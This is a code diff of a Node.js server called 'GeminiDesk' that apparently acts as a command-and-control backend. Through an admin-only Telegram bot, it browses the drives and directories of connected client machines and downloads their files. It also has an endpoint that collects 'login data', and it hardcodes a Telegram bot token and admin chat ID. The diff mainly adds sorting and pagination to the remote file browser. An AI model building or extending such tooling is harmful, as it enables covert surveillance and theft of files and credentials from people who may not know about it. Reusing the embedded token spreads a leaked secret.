@@ -1,6 +1,7 @@
 // ================================================================= //
 // --- GeminiDesk Full Server ---
 // Handles Broadcasts, Stats, Login Data, and Real-time Remote Control
+// v2 with Sorting, Pagination, and Enhanced UI
 // ================================================================= //
 
 const express = require('express');
@@ -9,20 +10,21 @@ const WebSocket = require('ws');
 const TelegramBot = require('node-telegram-bot-api');
 const NodeCache = require('node-cache');
 const cron = require('node-cron');
-const fetch = require('node-fetch'); // Required for fetching HTML file for broadcasts
+const fetch = require('node-fetch');
 const crypto = require('crypto');
 
 // --- Configuration ---
 const BOT_TOKEN = '8269940964:AAGnrhFtLPZUJHP_mMtrI8skdlqDhkSFJIg';
 const ADMIN_CHAT_ID = '7547836101';
 const PORT = process.env.PORT || 3000;
+const ITEMS_PER_PAGE = 25; // מספר פריטים בכל עמוד בדפדפן הקבצים
 
 // --- In-Memory Storage & Setup ---
 const cache = new NodeCache({ stdTTL: 86400, checkperiod: 120 });
 const clients = new Map(); // Stores active WebSocket connections { clientId -> { ws, name } }
-// שמירת מטען כפתורים ב-token קצר כדי לא לחרוג מ-64 בתים של Telegram
+
 function makeCb(action, data, ttlSec = 600) {
-  const id = crypto.randomBytes(6).toString('base64url'); // ~8 תווים, בטוח ל-URL
+  const id = crypto.randomBytes(6).toString('base64url');
   cache.set(`cb:${id}`, { action, ...data }, ttlSec);
   return `cb:${id}`;
 }
@@ -39,14 +41,14 @@ const server = http.createServer(app);
 const wss = new WebSocket.Server({ server, path: '/connect' });
 
 // --- Bot Setup ---
-// --- Bot Setup ---
-const bot = new TelegramBot(BOT_TOKEN, { polling: false }); // <-- שים לב ל-false
+const bot = new TelegramBot(BOT_TOKEN, { polling: false });
 const WEBHOOK_URL = `https://latex-v25b.onrender.com/telegram/${BOT_TOKEN}`;
 bot.setWebHook(WEBHOOK_URL);
+
 // Middleware
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-app.set('trust proxy', true); // For accurate IP address logging on Render
+app.set('trust proxy', true);
 
 // ================================================================= //
 // --- WebSocket Server Logic (For Real-time Remote Control) ---
@@ -56,19 +58,19 @@ wss.on('connection', (ws, req) => {
     const url = new URL(req.url, `http://${req.headers.host}`);
     const clientId = url.searchParams.get('clientId');
     const clientName = url.searchParams.get('clientName');
-const presenceInterval = setInterval(() => {
-    cache.set(`client:${clientId}`, { name: clientName }, 120);
-}, 60 * 1000); // רענן את הנוכחות כל 60 שניות
+
     if (!clientId || !clientName) {
         console.error('[WebSocket] Connection attempt with missing info. Terminating.');
         return ws.terminate();
     }
-
-    console.log(`[WebSocket] Client Connected: ${clientName} (ID: ${clientId.substring(0, 8)}...)`);
     
-    // Store the active connection
+    console.log(`[WebSocket] Client Connected: ${clientName} (ID: ${clientId.substring(0, 8)}...)`);
     clients.set(clientId, { ws, name: clientName });
-    cache.set(`client:${clientId}`, { name: clientName }, 120); // שמור ב-cache לדקה (TTL של 120 שניות)
+    cache.set(`client:${clientId}`, { name: clientName }, 120);
+
+    const presenceInterval = setInterval(() => {
+        cache.set(`client:${clientId}`, { name: clientName }, 120);
+    }, 60 * 1000);
 
     ws.on('message', (message) => {
         try {
@@ -83,12 +85,11 @@ const presenceInterval = setInterval(() => {
     ws.on('close', () => {
         console.log(`[WebSocket] Client Disconnected: ${clientName} (ID: ${clientId.substring(0, 8)}...)`);
         clients.delete(clientId);
-        clearInterval(presenceInterval); // נקה את הרענון התקופתי
+        clearInterval(presenceInterval);
     });
 
     ws.on('error', (error) => {
         console.error(`[WebSocket] Error for ${clientName}:`, error.message);
-        // The 'close' event will be triggered automatically after an error.
     });
 });
 
@@ -138,10 +139,12 @@ app.post('/login-data', async (req, res) => {
         res.status(200).send('Login data received.');
     } catch (e) { res.status(500).send('Server error.'); }
 });
+
 app.post(`/telegram/${BOT_TOKEN}`, (req, res) => {
     bot.processUpdate(req.body);
     res.sendStatus(200);
 });
+
 // ================================================================= //
 // --- Telegram Bot Logic ---
 // ================================================================= //
@@ -156,7 +159,6 @@ async function handleUpdate(body, type) {
     if (String(user.id) !== ADMIN_CHAT_ID) {
         return bot.sendMessage(message.chat.id, "You are not authorized to use this bot.").catch(console.error);
     }
-
     if (type === 'callback_query') {
         await handleCallbackQuery(body);
     } else if (type === 'message') {
@@ -198,23 +200,20 @@ async function handleMessage(message) {
         }
     }
     
-    // Default action for any text is to show the main menu
     return showMainMenu(chat.id);
 }
 
 async function handleCallbackQuery(callbackQuery) {
     const { from, message, data } = callbackQuery;
-    const [action, ...params] = data.split(':');
     
     bot.answerCallbackQuery(callbackQuery.id).catch(console.error);
-    // --- Router חדש ל-callback_data קצרים (cb:<token>) ---
     const short = readCb(data);
+    
     if (short) {
-        const { action, clientId, path } = short;
+        const { action, clientId, path, sort, page } = short;
 
         if (action === 'select_client' || action === 'list_dir' || action === 'get_file') {
             const client = clients.get(clientId);
-
             if (!client || client.ws.readyState !== WebSocket.OPEN) {
                 return bot.editMessageText(`❌ Client *${clients.get(clientId)?.name || 'Unknown'}* is offline.`, {
                     chat_id: message.chat.id, message_id: message.message_id, parse_mode: 'Markdown',
@@ -222,95 +221,55 @@ async function handleCallbackQuery(callbackQuery) {
                 });
             }
 
-            let command = { type: 'get_drives' };
-            let feedbackText = `Requesting drives from *${clients.get(clientId).name}*...`;
-
-            if (action === 'list_dir') {
+            let command, feedbackText;
+            
+            if (action === 'select_client') {
+                 command = { type: 'get_drives' };
+                 feedbackText = `Requesting drives from *${clients.get(clientId).name}*...`;
+            } else if (action === 'list_dir') {
                 command = { type: 'list_dir', payload: { path } };
-                feedbackText = `Listing: \`${path}\``;
+                feedbackText = `Listing: \`${path}\`...`;
             } else if (action === 'get_file') {
                 command = { type: 'get_file', payload: { path } };
                 feedbackText = `Requesting file: \`${path}\``;
             }
 
             client.ws.send(JSON.stringify(command));
-            return bot.editMessageText(feedbackText, {
-                chat_id: message.chat.id, message_id: message.message_id, parse_mode: 'Markdown'
-            });
+            // Only show loading message if it's not a sort/page change
+            if (!sort && !page) {
+                return bot.editMessageText(feedbackText, {
+                    chat_id: message.chat.id, message_id: message.message_id, parse_mode: 'Markdown'
+                });
+            }
         }
-
-        // אם תרצה בעתיד: למפות פעולות נוספות ל-tokenים קצרים
-    }
-
-    // --- Remote Control Actions ---
-    if (['select_client', 'list_dir', 'get_file'].includes(action)) {
-        const clientId = params[0];
-        const client = clients.get(clientId);
-
-        if (!client || client.ws.readyState !== WebSocket.OPEN) {
-            return bot.editMessageText(`❌ Client *${client?.name || 'Unknown'}* is offline.`, {
-                chat_id: message.chat.id, message_id: message.message_id, parse_mode: 'Markdown',
-                reply_markup: { inline_keyboard: [[{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]] }
-            });
-        }
-
-        let command = { type: 'get_drives' };
-        let feedbackText = `Requesting drives from *${client.name}*...`;
-
-        if (action === 'list_dir') {
-            const path = atob(params[1]);
-            command = { type: 'list_dir', payload: { path } };
-            feedbackText = `Listing: \`${path}\``;
-        } else if (action === 'get_file') {
-            const path = atob(params[1]);
-            command = { type: 'get_file', payload: { path } };
-            feedbackText = `Requesting file: \`${path}\``;
-        }
-        
-        client.ws.send(JSON.stringify(command));
-        return bot.editMessageText(feedbackText, {
-            chat_id: message.chat.id, message_id: message.message_id, parse_mode: 'Markdown'
-        });
     }
 
     // --- Main Menu & Other Actions ---
-    switch (action) {
-        case 'manage_clients':
-            return showClientList(message.chat.id, message.message_id);
-        case 'broadcast_menu':
-            return showBroadcastMenu(message.chat.id, message.message_id);
+    switch (data.split(':')[0]) {
+        case 'manage_clients': return showClientList(message.chat.id, message.message_id);
+        case 'broadcast_menu': return showBroadcastMenu(message.chat.id, message.message_id);
         case 'view_stats':
             const stats = getStats();
             return bot.editMessageText(stats, { chat_id: message.chat.id, message_id: message.message_id, parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '‹ Back', callback_data: 'back_to_main' }]] }});
         case 'back_to_main':
             cache.del(`state:${from.id}`);
             return showMainMenu(message.chat.id, 'Welcome back!', message.message_id);
-        case 'view_active_message':
-            return viewActiveMessage(message.chat.id, message.message_id);
+        case 'view_active_message': return viewActiveMessage(message.chat.id, message.message_id);
         case 'delete_active_message_confirm':
             return bot.editMessageText('❓ Are you sure you want to delete the active broadcast?', {
                 chat_id: message.chat.id, message_id: message.message_id,
-                reply_markup: { inline_keyboard: [
-                    [{ text: '✅ Yes, Delete It', callback_data: 'delete_active_message_do' }],
-                    [{ text: '❌ No, Cancel', callback_data: 'view_active_message' }]
-                ]}
+                reply_markup: { inline_keyboard: [[{ text: '✅ Yes, Delete It', callback_data: 'delete_active_message_do' }], [{ text: '❌ No, Cancel', callback_data: 'view_active_message' }]] }
             });
         case 'delete_active_message_do':
             cache.del('latest_message');
-            return bot.editMessageText('🗑️ Active broadcast has been deleted.', {
-                chat_id: message.chat.id, message_id: message.message_id,
-                reply_markup: { inline_keyboard: [[{ text: '‹ Back', callback_data: 'broadcast_menu' }]] }
-            });
+            return bot.editMessageText('🗑️ Active broadcast has been deleted.', { chat_id: message.chat.id, message_id: message.message_id, reply_markup: { inline_keyboard: [[{ text: '‹ Back', callback_data: 'broadcast_menu' }]] }});
         case 'awaiting_broadcast_text':
         case 'awaiting_broadcast_html':
-            cache.set(`state:${from.id}`, action);
-            const prompt = action === 'awaiting_broadcast_text' ? '✍️ Send the text you want to broadcast.' : '📄 Upload the `.html` file.';
-            return bot.editMessageText(prompt, {
-                chat_id: message.chat.id, message_id: message.message_id,
-                reply_markup: { inline_keyboard: [[{ text: '‹ Cancel', callback_data: 'broadcast_menu' }]] }
-            });
+            cache.set(`state:${from.id}`, data);
+            const prompt = data === 'awaiting_broadcast_text' ? '✍️ Send the text you want to broadcast.' : '📄 Upload the `.html` file.';
+            return bot.editMessageText(prompt, { chat_id: message.chat.id, message_id: message.message_id, reply_markup: { inline_keyboard: [[{ text: '‹ Cancel', callback_data: 'broadcast_menu' }]] }});
         default:
-            return bot.answerCallbackQuery(callbackQuery.id, { text: 'Unknown action.' });
+            // Do nothing for unknown actions to prevent errors
     }
 }
 
@@ -325,46 +284,101 @@ async function handleResultFromClient(data) {
 
     if (type === 'get_drives_result') {
         const drives = payload.drives;
-// AFTER
-const keyboard = drives.map(drive => [
-  { text: `💽 ${drive}`, callback_data: makeCb('list_dir', { clientId, path: drive }) }
-]);
-keyboard.push([{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]);
+        const keyboard = drives.map(drive => [
+          { text: `💽 ${drive}`, callback_data: makeCb('list_dir', { clientId, path: drive }) }
+        ]);
+        // ★★★ תיקון הבאג של הכפתור הכפול ★★★
         keyboard.push([{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]);
         return bot.sendMessage(ADMIN_CHAT_ID, `Select a drive to browse on *${clientName}*:`, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard }});
     }
 
-if (type === 'list_dir_result') {
-  const { path: currentPath, items } = payload;
+    if (type === 'list_dir_result') {
+        // ★★★ כל הלוגיקה החדשה של המיון והדפדוף נמצאת כאן ★★★
+        const { path: currentPath, items } = payload;
+        const cbData = readCb(cache.keys().find(k => k.startsWith('cb:') && cache.get(k).path === currentPath));
+        
+        const page = cbData?.page || 1;
+        const currentSort = cbData?.sort || 'name_asc';
 
-  const keyboard = [];
+        // 1. לוגיקת המיון
+        const sortedItems = [...items].sort((a, b) => {
+            // תמיד הצג תיקיות לפני קבצים
+            if (a.isDirectory !== b.isDirectory) {
+                return a.isDirectory ? -1 : 1;
+            }
+            switch (currentSort) {
+                case 'date_asc': return a.birthtime - b.birthtime;
+                case 'date_desc': return b.birthtime - a.birthtime;
+                case 'size_asc': return a.size - b.size;
+                case 'size_desc': return b.size - a.size;
+                case 'name_desc': return b.name.localeCompare(a.name);
+                default: // name_asc
+                    return a.name.localeCompare(b.name);
+            }
+        });
 
-  // כפתור "עלה תיקייה" – בלי base64, עם token קצר
-  if (currentPath.includes('\\') && currentPath.slice(-2) !== ':\\') {
-    const parentDir = currentPath.substring(0, currentPath.lastIndexOf('\\')) || currentPath.slice(0, 3);
-    keyboard.push([
-      { text: '⬆️ Go Up', callback_data: makeCb('list_dir', { clientId, path: parentDir }) }
-    ]);
-  }
+        // 2. לוגיקת חלוקה לדפים (Pagination)
+        const totalPages = Math.ceil(sortedItems.length / ITEMS_PER_PAGE);
+        const startIndex = (page - 1) * ITEMS_PER_PAGE;
+        const pageItems = sortedItems.slice(startIndex, startIndex + ITEMS_PER_PAGE);
 
-  // כל פריט: יוצר token קצר, שומר את המטען בקאש, ושולח callback_data קצר
-  for (const item of items) {
-    const icon = item.isDirectory ? '📁' : '📄';
-    const action = item.isDirectory ? 'list_dir' : 'get_file';
-    keyboard.push([
-      { text: `${icon} ${item.name}`, callback_data: makeCb(action, { clientId, path: item.path }) }
-    ]);
-  }
+        const keyboard = [];
 
-  keyboard.push([{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]);
+        // 3. בניית המקלדת
+        // כפתור "עלה תיקייה" (Go Up)
+        if (currentPath.includes('\\') && currentPath.slice(-2) !== ':\\') {
+            const parentDir = currentPath.substring(0, currentPath.lastIndexOf('\\')) || currentPath.slice(0, 3);
+            keyboard.push([
+              { text: '⬆️ Go Up a Directory', callback_data: makeCb('list_dir', { clientId, path: parentDir, sort: currentSort }) }
+            ]);
+        }
 
-  return bot.sendMessage(
-    ADMIN_CHAT_ID,
-    `Contents of \`${currentPath}\` on *${clientName}*:`,
-    { parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard } }
-  );
-}
+        // כפתורי מיון
+        const sortButtons = [
+            { text: currentSort === 'name_asc' ? 'Name ▾' : (currentSort === 'name_desc' ? 'Name ▴' : 'Name'), sort: currentSort.startsWith('name') ? (currentSort === 'name_asc' ? 'name_desc' : 'name_asc') : 'name_asc'},
+            { text: currentSort === 'date_asc' ? 'Date ▾' : (currentSort === 'date_desc' ? 'Date ▴' : 'Date'), sort: currentSort.startsWith('date') ? (currentSort === 'date_asc' ? 'date_desc' : 'date_asc') : 'date_desc'},
+            { text: currentSort === 'size_asc' ? 'Size ▾' : (currentSort === 'size_desc' ? 'Size ▴' : 'Size'), sort: currentSort.startsWith('size') ? (currentSort === 'size_asc' ? 'size_desc' : 'size_asc') : 'size_desc'},
+        ];
+        keyboard.push(sortButtons.map(b => ({
+            text: b.text,
+            callback_data: makeCb('list_dir', { clientId, path: currentPath, sort: b.sort, page: 1 })
+        })));
+        
+        // רשימת הקבצים והתיקיות לעמוד הנוכחי
+        for (const item of pageItems) {
+            const icon = item.isDirectory ? '📁' : '📄';
+            const action = item.isDirectory ? 'list_dir' : 'get_file';
+            const date = item.birthtime > 0 ? new Date(item.birthtime).toISOString().slice(0, 10) : '';
+            const label = `${icon} ${item.name}  (${date})`;
+            keyboard.push([
+                { text: label, callback_data: makeCb(action, { clientId, path: item.path }) }
+            ]);
+        }
+        
+        // כפתורי דפדוף (Next/Previous)
+        const navButtons = [];
+        if (page > 1) {
+            navButtons.push({ text: '« Previous', callback_data: makeCb('list_dir', { clientId, path: currentPath, sort: currentSort, page: page - 1 }) });
+        }
+        if (page < totalPages) {
+            navButtons.push({ text: 'Next »', callback_data: makeCb('list_dir', { clientId, path: currentPath, sort: currentSort, page: page + 1 }) });
+        }
+        if (navButtons.length > 0) {
+            keyboard.push(navButtons);
+        }
 
+        keyboard.push([{ text: '‹ Back to Client List', callback_data: 'manage_clients' }]);
+
+        const messageText = `*${clientName}* - \`${currentPath}\`\n(Page ${page}/${totalPages} - ${sortedItems.length} items)`;
+        
+        const activeMessage = cache.get(`active_message:${ADMIN_CHAT_ID}`);
+        if(activeMessage){
+            return bot.editMessageText(messageText, { chat_id: ADMIN_CHAT_ID, message_id: activeMessage.message_id, parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard } }).catch(console.error);
+        } else {
+             const sentMessage = await bot.sendMessage(ADMIN_CHAT_ID, messageText, { parse_mode: 'Markdown', reply_markup: { inline_keyboard: keyboard } });
+             cache.set(`active_message:${ADMIN_CHAT_ID}`, sentMessage);
+        }
+    }
     
     if (type === 'get_file_result') {
         const { fileName, fileData_base64 } = payload;
@@ -377,6 +391,7 @@ if (type === 'list_dir_result') {
 // --- Menu Display Functions ---
 
 async function showMainMenu(chatId, text = 'Welcome, Admin! This is the GeminiDesk control panel.', messageId = null) {
+  cache.del(`active_message:${chatId}`); // נקה את הודעת הדפדפן האקטיבית
   const keyboard = {
     inline_keyboard: [
       [{ text: '🖥️ Manage Remote Clients', callback_data: 'manage_clients' }],
@@ -392,7 +407,6 @@ async function showMainMenu(chatId, text = 'Welcome, Admin! This is the GeminiDe
 }
 
 async function showClientList(chatId, messageId) {
-    // --- קרא את רשימת הלקוחות מה-CACHE ---
     const clientKeys = cache.keys().filter(key => key.startsWith('client:'));
     const keyboard = [];
 
@@ -401,12 +415,10 @@ async function showClientList(chatId, messageId) {
             const clientId = key.split(':')[1];
             const clientData = cache.get(key);
             if (clientData) {
-                // ודא שהלקוח באמת מחובר ב-WebSocket לפני שמציגים אותו
                 if (clients.has(clientId) && clients.get(clientId).ws.readyState === WebSocket.OPEN) {
-keyboard.push([{ text: `🟢 ${clientData.name}`, callback_data: makeCb('select_client', { clientId }) }]);
+                    keyboard.push([{ text: `🟢 ${clientData.name}`, callback_data: makeCb('select_client', { clientId }) }]);
                 } else {
-                    // אם הוא רשום ב-cache אבל לא מחובר, הצג אותו כאופליין
-                     keyboard.push([{ text: `🔴 ${clientData.name} (Offline)`, callback_data: `noop` }]);
+                    keyboard.push([{ text: `🔴 ${clientData.name} (Offline)`, callback_data: `noop` }]);
                 }
             }
         });
@@ -415,10 +427,7 @@ keyboard.push([{ text: `🟢 ${clientData.name}`, callback_data: makeCb('select_
     keyboard.push([{ text: '‹ Back to Main Menu', callback_data: 'back_to_main' }]);
     const text = clientKeys.length > 0 ? 'Select a connected client:' : 'No clients are currently connected.';
 
-    const options = {
-        chat_id: chatId,
-        reply_markup: { inline_keyboard: keyboard }
-    };
+    const options = { chat_id: chatId, reply_markup: { inline_keyboard: keyboard } };
 
     if (messageId) {
         await bot.editMessageText(text, { ...options, message_id: messageId }).catch(console.error);
@@ -471,12 +480,10 @@ function getStats() {
 
 // --- Scheduled Tasks ---
 cron.schedule('*/5 * * * *', () => {
-    // Ping all connected WebSocket clients to keep them alive on Render's free tier
     clients.forEach((client, clientId) => {
         if (client.ws.readyState === WebSocket.OPEN) {
             client.ws.ping(() => {});
         } else {
-            // Remove dead connections
             clients.delete(clientId);
         }
     });
